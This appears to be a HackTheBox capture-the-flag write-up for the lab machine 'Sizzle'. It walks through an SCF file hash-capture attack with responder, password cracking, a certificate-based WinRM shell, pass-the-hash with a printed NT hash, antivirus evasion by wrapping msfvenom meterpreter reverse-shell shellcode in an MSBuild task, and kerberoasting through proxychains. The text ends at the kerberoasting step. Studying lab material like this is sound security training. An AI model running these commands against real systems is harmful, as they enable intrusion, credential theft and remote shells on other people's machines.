### Quick Summary
#### Hey guys today Sizzle retired and here's my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an `smb` share, a simple `scf` file attack with `responder` and `john` could give me a password for a user. With that password I could generate a certificate request and get a certificate then a `WinRm` session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It's a Windows box and its ip is `10.10.10.103`, I added it to `/etc/hosts` as `sizzle.htb`. Let's jump right in !

### Nmap
#### As always we will start with `nmap` to scan for open ports and services :
`nmap -sV -sT -sC sizzle.htb`

#### We got a lot of ports, we got `ftp` on port 21, `dns` on port 53, `http` on port 80, `smb` and `ldap`. We also see that the domain is `HTB.LOCAL` and commonName is `sizzle.htb.local`, so I added it to `/etc/hosts` :
![](/images/hackthebox/sizzle/3.png)
#### anonymous authentication on `ftp` was allowed but there was nothing there so I will skip that.
<hr>
### HTTP
#### I checked that `http` server and the index only had this `gif` :
![](/images/hackthebox/sizzle/4.png)
<br>
<br>
![](/images/hackthebox/sizzle/5.png)
#### So I ran `gobuster` :

```
#### `/certenroll` sounds interesting, but unfortunately it's a `403` :
![](/images/hackthebox/sizzle/6.png)
#### It's time to check `smb` .
<br>
<hr>
### SMB, SCF File Attack, amanda's Credentials
#### First thing we need to know is the shares, we can use `smbclient` to list the shares :
`smbclient --list //sizzle.htb/ -U ""`
![](/images/hackthebox/sizzle/7.png)
#### I noticed that there was a share for Active Directory Certificate Services. Most likely `/certsrv` will be on the web server :
`http://sizzle.htb/certsrv`
![](/images/hackthebox/sizzle/8.png)
#### Yes it was there, and we need credentials. Back to `smb` the only share I could access anonymously was `Department Shares` :
![](/images/hackthebox/sizzle/9.png)
#### It had a lot of directories, I could write to 2 of them :  `ZZ_ARCHIVE` and `Users/Public`. 
![](/images/hackthebox/sizzle/10.png)
#### We are looking for credentials. Since we can write to one of the directories then we can possibly apply an `scf` file attack. You can read about it [here](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/). We are going to put an `scf` file in `Users/Public`. It looks like this :
![](/images/hackthebox/sizzle/11.png)
```
[Shell]
Command=2
IconFile=\\10.10.xx.xx\share\rick.ico
[Taskbar]
Command=ToggleDesktop
```
#### Then we will run `responder`. Whenever a user browses that directory he will automatically try to connect to my box through `smb`, that's when `responder` catches the hashes. More info in the link above. 
![](/images/hackthebox/sizzle/12.png)
<br>
<br>
`reponder -I tun0`
![](/images/hackthebox/sizzle/13.png)
#### `responder` caught hash for a user called `amanda`. Let's crack it with `john` :
![](/images/hackthebox/sizzle/14.png)
#### The password is `Ashare1972`
<br>
<hr>
### Requesting a Certificate, WinRm Session as amanda
#### I tried to access `certenroll` as `amanda` and it worked fine :
![](/images/hackthebox/sizzle/15.png)
#### So I went to `/certsrv`  and used `amanda`'s credentials to authenticate
![](/images/hackthebox/sizzle/16.png)
<br>
<br>
![](/images/hackthebox/sizzle/17.png)
#### Now it's time to get a certificate. But wait a second, what's the certificate for anyway ?
#### A full `nmap` scan shows that `WinRm` ports are open :
`nmap -p- -T5 -vvv --max-retries 1 sizzle.htb`
![](/images/hackthebox/sizzle/18.png)
#### Full Output :

#### Port 5985 uses `http` while `5986` uses `https`. When I got `amanda`'s credentials I tried to connect to port 5985 and I couldn't, So we will do it through port 5986 that's why we need a certificate. (If you don't know how to connect through `WinRm`, we'll get to that later.)
#### We will generate a certificate request and a private key :
`openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr`
![](/images/hackthebox/sizzle/20.png)
#### Then we will submit an advanced certificate request, paste our request and download the certificate (base64 encoded)

<br>
![](/images/hackthebox/sizzle/22.png)
<br>
<br>
![](/images/hackthebox/sizzle/23.png)
#### Now we can use `WinRm`, but what's `WinRm` ?
> Windows Remote Management (WinRM) is the Microsoft implementation of [WS-Management Protocol](https://docs.microsoft.com/en-us/windows/desktop/winrm/ws-management-protocol), a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems, from different vendors, to interoperate.
The WS-Management protocol specification provides a common way for systems to access and exchange management information across an IT infrastructure. WinRM and [_Intelligent Platform Management Interface (IPMI)_](https://docs.microsoft.com/en-us/windows/desktop/winrm/windows-remote-management-glossary), along with the [Event Collector](https://go.microsoft.com/fwlink/p/?linkid=84396) are components of the [Windows Hardware Management](https://go.microsoft.com/fwlink/p/?linkid=45204) features. -[Microsoft](https://docs.microsoft.com/en-us/windows/desktop/winrm/portal)


#### `WinRm` is not meant to be used from Linux but luckily there's a [Ruby library](https://github.com/WinRb/WinRM) for it. That's how we will connect. 
#### I used [Alamot's shell](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) and added some stuff for the cert and the key :
![](/images/hackthebox/sizzle/24.png)
```
#!/usr/bin/ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new( 
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  client_cert: '/root/Desktop/HTB/boxes/sizzle/certs/certnew.cer',
  client_key: '/root/Desktop/HTB/boxes/sizzle/certs/request.key',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```
#### And it worked :
![](/images/hackthebox/sizzle/25.png)
#### But there was no `user.txt` :
![](/images/hackthebox/sizzle/26.png)
<hr>
### Stored NTLM Hashes, Secretsdump, Privilege Escalation
#### Through the filesystem enumeration I found a file called `file.txt` in `C:\Windows\System32`. That file had NTLM hashes for all users !

```
#### Honestly I don't know how did that get there, After resetting the machine the file was still there. I don't know if the creator made an unintended mistake but anyway let's see how can we use that. 
#### That Administrator hash was useless, I tried it with `smb`, I cracked it, tried `psexec`. It didn't work. I cracked `mrlky`'s hash :
![](/images/hackthebox/sizzle/28.png)
#### The password was `Football#7`, I used it with `secretsdump.py` from `impacket` and got another Administrator's hash :
![](/images/hackthebox/sizzle/29.png)
#### It was uncrackable, I tried `psexec` `metasploit` module and for some reason it didn't work so I used the hash with `smb` to access `C$` then I downloaded the flags.
`smbclient //sizzle.htb/C$ -U "Administrator" --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267`
![](/images/hackthebox/sizzle/30.png)
<br>
<br>
![](/images/hackthebox/sizzle/31.png)
#### Now forget that we saw that, Let's try something more realistic.
<br>
<hr>
### Backtrack
#### Back to the `WinRm` session as `amanda`, let's examine our environment.
#### There was AppLocker :
![](/images/hackthebox/sizzle/32.png)
#### Antivirus :
![](/images/hackthebox/sizzle/33.png)
#### We were even in Constrained Language Mode in PowerShell :
![](/images/hackthebox/sizzle/34.png)
#### Since this was an Active Directory environment I wanted to do kerberoasting, but `Invoke-Kerberoast.ps1` needed Full Language Mode, I couldn't use `GetUserSPNs.py` because the services were internal only. And my attempts to evade the antivirus failed. I could bypass the constrained language mode with [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM) and still couldn't use `Invoke-Kerberoast.ps1`. AppLocker is easy to [bypass](https://github.com/api0cradle/UltimateAppLockerByPassList) so it wasn't an issue. But I had to bypass the antivirus. 
<br>
<hr>
### Bypassing AV
#### I found [this article](https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/) and this [POC](https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml)
#### First time I created the payload like this :
`msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -f csharp`
#### And I added the shellcode to the POC and applied the exploit :
`C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml`
![](/images/hackthebox/sizzle/35.png)
#### The antivirus detected it. I added an encoder and 100 iterations and tried again :
`msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -e x86/shikata_ga_nai -i 100 -f csharp`
![](/images/hackthebox/sizzle/36.png)
#### Then I added the shellcode to `shellcode.xml`
#### `shellcode.xml` :

#### This time it worked and I got `meterpreter` !

<hr>
### Kerberoasting, Privilege Escalation
#### Now we have a `meterpreter` session, we can route the internal subnet, use a proxy then use `GetUserSPNs.py` and see if any user is kerberoastable. This technique is covered [here](https://www.blackhillsinfosec.com/a-toast-to-kerberoast/)
#### First thing is to configure `proxychains` to use port 8080 :
`/etc/proxychains.conf`
![](/images/hackthebox/sizzle/39.png)
#### Then we will use `auxiliary/server/socks4a` to add the route and set up the proxy :
![](/images/hackthebox/sizzle/40.png)
#### `route add 10.10.10.0 255.255.255.0 1` this adds a route of the whole internal subnet where `1` is the session number.
#### Now we are ready. Let's kerberoast !
`proxychains GetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.LOCAL/amanda:Ashare1972`
![](/images/hackthebox/sizzle/41.png)
#### User `mrlky` was kerberoastable and we got a hash, let's pass it to `john` :
